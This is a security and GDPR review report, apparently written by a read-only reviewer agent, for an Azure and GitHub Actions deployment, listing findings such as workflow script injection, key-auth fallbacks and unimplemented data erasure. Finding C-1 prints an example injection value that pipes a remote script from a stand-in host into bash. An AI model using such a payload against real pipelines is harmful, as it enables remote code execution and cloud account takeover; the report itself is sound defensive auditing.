# SalesPrism Security + GDPR Review — Stage 7 (wider system view)

**Scope:** infra/ Bicep, provision-customer.yml, EU residency chain, SR-001/SR-002 class, dependency hygiene (partial), SAD §16/§31/§32 vs. reality.
**Branch:** develop @ bb28ab5 · **Reviewer:** security-reviewer agent (read-only), transcribed by lead
**Complements:** docs/reviews/codex-review-1-infra-pipeline.md, docs/reviews/codex-review-2-features.md

## VERDICT: FAIL

One CRITICAL pipeline RCE plus multiple BLOCKER-class gaps between what the SAD promises as hard security guarantees and what the code/infra actually does — on top of the already-tracked SR-001/SR-002 and Codex round 2's app-layer findings.

---

## CRITICAL

### C-1 — GitHub Actions script injection in `provision-customer.yml` → RCE with the pipeline's Azure OIDC identity

Five `workflow_dispatch` inputs are free-text `type: string` (`customer_slug`, `company_name`, `persona_system_prompt`, `logo_url`, `theme_id`, lines 11–67) and are interpolated **directly into `run:` shell blocks** as `${{ inputs.X }}` instead of being passed via `env:` and referenced as `$VAR`. GitHub expands these as raw text *before* the shell runs — textbook template injection.

Confirmed unsafe sites, including in jobs holding an authenticated `az` session:
- L199–205 (`az deployment sub what-if`), L220–227 (`az deployment sub create`) — in `deploy-infrastructure`, **after** `azure/login@v2`.
- L489–501 — `PERSONA_SYSTEM_PROMPT="${{ inputs.persona_system_prompt }}"` in `configure-application`, after Azure login. This input is *documented* as free-text prompt content, i.e. guaranteed to contain quotes/newlines eventually.
- L96–104, 119–130, 132–138, 142–144 — the `validate` job's own guard steps. **The step meant to reject a malicious slug is where it first executes.**

**Exploit:** `customer_slug` = `x"; curl -sL https://evil/p.sh | bash #` breaks the quoted context. Injected code runs after OIDC login; even before it, any step in a job with `id-token: write` can mint its own token via `ACTIONS_ID_TOKEN_REQUEST_URL`/`_TOKEN`. Because `az deployment sub create` is subscription-scoped, the federated identity cannot be narrower than subscription-wide → **path to subscription-wide compromise**, triggerable by anyone who can dispatch the workflow. The environment approval gate does not mitigate: the reviewer approves "deploy customer X", not a shell-metacharacter audit of the string.

**Fix:** move every `inputs.*` into step-level `env:` and reference as `$VAR` (~15 occurrences in `run:` bodies). Never `${{ inputs.* }}` inside `run:`. Re-run the regex guards against the env-bound variable.

---

## HIGH (blocker-class)

### H-1 — Local-auth gap is wider than SR-002, and two services have a live key fallback in code
SR-002 tracks only OpenAI + Document Intelligence. Also unset:
- `ai-search.bicep` — no `disableLocalAuth` on `Microsoft.Search/searchServices`.
- `cosmos-db.bicep:29-31` — sets `disableKeyBasedMetadataWriteAccess` but **not** `disableLocalAuth`; master keys still allow full data-plane access.
- `storage.bicep` — no `allowSharedKeyAccess: false`.
- **`src/features/common/services/cosmos.ts:10-19,30-35`** and **`azure-storage.ts:6-25`** contain live `if (USE_MANAGED_IDENTITIES) {...} else { read AZURE_COSMOSDB_KEY / AZURE_STORAGE_ACCOUNT_KEY }` branches — contradicting zero-secrets and inconsistent with `azure-ai.ts`/`document-intelligence.ts`/`azure-speech.ts`/`key-vault.ts`, which use `DefaultAzureCredential` unconditionally.
- `src/.env.example:42,74` documents both keys as configurable, normalizing the fallback.

Dormant today only because `USE_MANAGED_IDENTITIES=true` is set in `app-service.bicep:129`. Nothing at resource level prevents the key path if that setting drifts (portal edit, slot swap, incident shortcut). Combined with C-1, an attacker with pipeline RCE can set the key app settings and flip the flag themselves.

**Fix:** extend SR-002 to `ai-search.bicep`, `cosmos-db.bicep` (`disableLocalAuth: true`), `storage.bicep` (`allowSharedKeyAccess: false`); delete the key branches from `cosmos.ts`/`azure-storage.ts`; remove the `.env.example` placeholders.

### H-2 — SAD's "public inbound only via Cloudflare" guardrail is unimplemented, and the live env already violates it
SAD §7.1–7.3 guarantees Access Restrictions allowing only GitHub Actions ranges on SCM with all other public inbound blocked, and Full (strict) TLS with Managed Certificates explicitly ruled out.
- `app-service.bicep` has **no `ipSecurityRestrictions` at all** — the `*.azurewebsites.net` default hostname is internet-reachable and bypasses Cloudflare regardless of DNS proxy state.
- val1 currently runs an App Service **managed certificate, unproxied** — precisely the configuration §7.2 forbids. §7.3's "DDoS → Cloudflare absorbs" claim is false for the live deployment.
- Unlike SR-001, this deviation has **no decision-log entry, no ADR, no known-limitations note** — undocumented drift.

**Fix:** (a) add `ipSecurityRestrictions` scoped to Cloudflare + GitHub ranges and re-proxy DNS using the Origin Certificate flow already in the workflow; or (b) record an explicit decision accepting the loss of WAF/DDoS coverage and correct §7.3.

### H-3 — §16.2's "hard guardrail" Azure Policy does not exist
SAD §16.2 claims subscription policy denies non-EU regions such that "misconfiguration in Bicep cannot result in data leaving the EU". Grep for `policyDefinition`/`Microsoft.Authorization/policy` returns **nothing**. The only enforcement is the `@allowed` decorator in `main.bicep:12` — a parameter validation, not a policy. `main.bicep` is not on CLAUDE.md's off-limits list, so a one-line PR edit defeats it. The claim is false as implemented.

**Fix:** deploy the described policy definitions/assignments, or correct §16.2 to state the real (weaker) control, so §32.4's DPIA does not rely on a control that doesn't exist.

### H-4 — GDPR erasure/retention promised in §32.1/§32.3 is entirely unimplemented, undermining the DPIA
- §32.3 specifies `DELETE /api/admin/users/{userId}/gdpr-erase` with `eraseUser`/`anonymizeUser`/`deleteUserMessages`. Grep across `src/`: **nothing exists**, for any container.
- §32.1 promises 90-day Cosmos TTL and blob TTL. No `defaultTtl`/`ttl` in `cosmos-db.bicep`; no lifecycle policy in `storage.bicep`.
- §32.4's DPIA cites "90-dages TTL" as one of three mitigations making sensitive sales-conversation processing "sufficiently protected". **That mitigation does not exist**, so the document a customer's legal team would rely on cites an absent control.

**Fix:** implement erasure + TTL/lifecycle before any production DPIA/DPA sign-off, or revise §32.4 to reflect actual unmitigated risk.

### H-5 — No Azure Monitor alerting despite §31.2's 7-alert baseline
§31.2 lists 7 alerts "configured automatically by Bicep per customer". `observability.bicep` provisions only the workspace + App Insights; no `metricAlerts`/`scheduledQueryRules` anywhere in `infra/`. No automated signal for 5xx spikes, throttling, quota exhaustion or cost anomalies on any deployment.

---

## MEDIUM

- **M-1** `key-vault.bicep:10-25` sets soft-delete but not `enablePurgeProtection: true` — a delete-capable identity can soft-delete then purge, destroying escrowed certs with no recovery window.
- **M-2** PII bypassing `safe-logger` outside the reviewed surfaces: `chat-document-service.ts:45,49,52,102,113,160,171,218,228` (raw `console.error(msg, e)` on the upload path — carries filenames/DocIntel error text) and `ai-search.ts:17-20,31,40,45,53,58,66` (unconditional `console.log("Configuration parameters:", {...})` + full client dumps at module scope, on every cold start).
- **M-3** `middleware.ts` dual-list pattern is structurally fragile — the file's own comment documents that this desync caused the bug fixed in `84add51`. Currently in sync (verified). Fix: derive `matcher` from `requireAuth`, or invert to default-deny with a public allowlist.
- **M-4** `package.json:55` declares `openai@^4.67.1` — entirely unused (app uses `@ai-sdk/azure` + `ai` v6). Dead dependency = needless attack surface.

## LOW
- `document-intelligence.ts:10` logs endpoint via raw `console.log`.
- `eslint-config-next@14.0.4` against `next@^15.5.19` — two-major skew may under-cover Next 15 lint rules.

---

## GDPR status

| Control | Status |
|---|---|
| Region pinning (R1) | **PASS** — AI hard-pinned westeurope (ADR-001); Cosmos swedencentral (ADR-002) is an EU member state inside the EU Data Boundary — documented exception, not a violation |
| DataZoneStandard only (R2) | **PASS** — `GlobalStandard` appears nowhere in `infra/` or `src/` except in prohibiting comments |
| Zero secrets (R3) | **CONDITIONAL FAIL** — `AZURE_OPENAI_API_KEY` genuinely absent, but Cosmos + Storage retain live key fallbacks (H-1) |
| R1/R2 enforcement mechanism | **FAIL** — no Azure Policy (H-3); enforcement is human code review only |
| Telemetry destination | **PASS** — no third-party telemetry SDKs; App Insights/LAW per-customer, EU-only |
| Data subject rights (Art. 15/17/20) | **FAIL** — no erasure endpoint, no TTL, no automated export (H-4) |

**Summary:** the *inference-location* controls most reviewers focus on are genuinely solid — DataZoneStandard, EU-pinned regions, private endpoints are correctly implemented. The *data-lifecycle* controls (erasure, retention, policy enforcement) are not implemented at all, despite being written in the SAD as though they were.

---

## Verified vs. could-not-verify

**Verified by direct file read/grep:** 7/7 private endpoints with bound `privateDnsZoneGroups`; `publicNetworkAccess: Disabled` on all 7 backend modules; RBAC = 7 ARM assignments + 1 Cosmos SQL role, every one scoped to the individual resource (least privilege confirmed); `vnetRouteAllEnabled: true` + SystemAssigned identity; OIDC-only login with per-job minimal `permissions:`; `::add-mask::` on Cloudflare tokens and generated PFX password; DNS guard regex re-asserted before every Cloudflare call, no DELETE ever issued; CanNotDelete locks on Storage + Cosmos; Key Vault RBAC-auth + soft-delete (purge protection absent); `.env*.local` gitignored; no `AZURE_OPENAI_API_KEY` or `GlobalStandard` anywhere. C-1, H-1, H-2, H-3, H-4, H-5 all confirmed by reading, not inference.

**Could NOT verify:**
- `npm audit --omit=dev` — **not run**; this reviewer had Read/Glob/Grep only, no shell. A real CVE list still requires a shell run against `package-lock.json`.
- Live Azure state — review is IaC/source-level only; cannot confirm what is actually deployed vs. what the Bicep now says.
- The actual RBAC role granted to the GitHub OIDC identity (applied manually out-of-band) — this determines C-1's real blast radius.
- Cosmos container `defaultTtl` — container provisioning was not located in `src/`; may be created out-of-band.
- GitHub branch protection, the `production` environment's reviewer list, live Cloudflare zone/proxy settings — not in-repo artifacts.
